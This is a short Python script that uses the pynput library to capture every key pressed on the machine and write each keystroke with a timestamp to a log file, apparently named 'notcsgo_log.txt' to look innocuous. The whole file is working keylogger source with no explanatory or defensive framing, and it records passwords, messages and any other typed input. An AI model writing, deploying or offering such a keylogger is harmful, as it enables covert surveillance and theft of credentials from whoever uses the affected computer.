from pynput.keyboard import Key, Listener
import logging

from pathlib import Path

p = Path('tmp')
p.mkdir(exist_ok=True)
    
log_dir = ".\\tmp\\"

logging.basicConfig(filename=(log_dir + "notcsgo_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
        logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
